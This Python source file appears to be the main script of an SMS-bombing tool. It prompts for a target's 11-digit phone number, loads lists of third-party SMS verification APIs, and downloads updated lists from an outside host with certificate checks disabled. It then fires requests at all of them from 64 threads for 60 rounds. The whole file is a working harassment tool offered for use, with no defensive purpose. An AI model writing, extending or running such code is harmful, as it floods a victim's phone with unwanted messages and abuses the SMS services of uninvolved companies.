# encoding=utf8
# 短信轰炸主程序

from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List
import json
import pathlib
import sys
import time
import httpx
import os

# 确定应用程序路径
APP_PATH = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(__file__)

# 默认配置
DEFAULT_CONFIG = {
    "thread": 64,      # 默认线程数
    "frequency": 60,   # 默认执行次数
    "interval": 60     # 默认间隔时间(秒)
}

def load_apis() -> tuple[List[API], list]:
    """加载 API 配置文件
    Returns:
        tuple: (api_list, get_api_list)
    """
    try:
        # 加载 api.json
        json_path = pathlib.Path(APP_PATH, 'api.json')
        if not json_path.exists():
            raise FileNotFoundError("api.json not found")
        
        with open(json_path, "r", encoding="utf8") as f:
            apis = [API(**data) for data in json.loads(f.read())]
        logger.success(f"api.json 加载完成 接口数:{len(apis)}")

        # 加载 GETAPI.json
        getapi_path = pathlib.Path(APP_PATH, 'GETAPI.json')
        if not getapi_path.exists():
            raise FileNotFoundError("GETAPI.json not found")
            
        with open(getapi_path, "r", encoding="utf8") as f:
            get_apis = json.loads(f.read())
        logger.success(f"GETAPI.json 加载完成 接口数:{len(get_apis)}")

        return apis, get_apis

    except Exception as e:
        logger.error(f"加载API配置文件失败: {str(e)}")
        logger.info("正在尝试更新API配置...")
        update_apis()
        sys.exit(1)

def update_apis():
    """从 GitHub 更新 API 配置文件"""
    base_url = "https://hk1.monika.love/OpenEthan/SMSBoom/master"
    files = {
        "GETAPI.json": f"{base_url}/GETAPI.json",
        "api.json": f"{base_url}/api.json"
    }

    try:
        with httpx.Client(verify=False, timeout=10) as client:
            for filename, url in files.items():
                content = client.get(url, headers=default_header_user_agent()).content.decode("utf8")
                with open(pathlib.Path(APP_PATH, filename), "w", encoding="utf8") as f:
                    f.write(content)
        logger.success("API配置更新成功!")
    except Exception as e:
        logger.error(f"更新失败: {str(e)}")
        logger.info("请检查网络连接并关闭代理后重试")
        sys.exit(1)

def validate_phone(phone: str) -> bool:
    """验证手机号格式
    Args:
        phone: 手机号
    Returns:
        bool: 是否有效
    """
    return phone.isdigit() and len(phone) == 11

def start_bombing():
    """启动轰炸程序"""
    # 获取并验证手机号
    while True:
        phone = input("请输入目标手机号: ").strip()
        if validate_phone(phone):
            break
        logger.error("请输入正确的11位手机号!")

    config = DEFAULT_CONFIG
    logger.info(f"目标手机号: {phone}")
    logger.info(f"配置信息: 线程数={config['thread']}, 轮数={config['frequency']}, 间隔={config['interval']}秒")

    # 加载API
    apis, get_apis = load_apis()

    # 开始轰炸
    with ThreadPoolExecutor(max_workers=config['thread']) as pool:
        for round in range(1, config['frequency'] + 1):
            logger.success(f"第 {round}/{config['frequency']} 轮轰炸开始")
            
            # 提交所有API任务
            for api in apis + get_apis:
                pool.submit(reqFunc, api, phone)
            
            logger.success(f"第 {round} 轮轰炸提交完成")
            
            # 最后一轮不需要等待
            if round < config['frequency']:
                logger.info(f"等待 {config['interval']} 秒后开始下一轮...")
                time.sleep(config['interval'])

    logger.success("轰炸任务已完成!")

if __name__ == "__main__":
    try:
        logger.info("短信轰炸程序启动...")
        start_bombing()
    except KeyboardInterrupt:
        logger.warning("\n程序被用户中断")
        sys.exit(0)
    except Exception as e:
        logger.error(f"程序异常: {str(e)}")
        sys.exit(1)
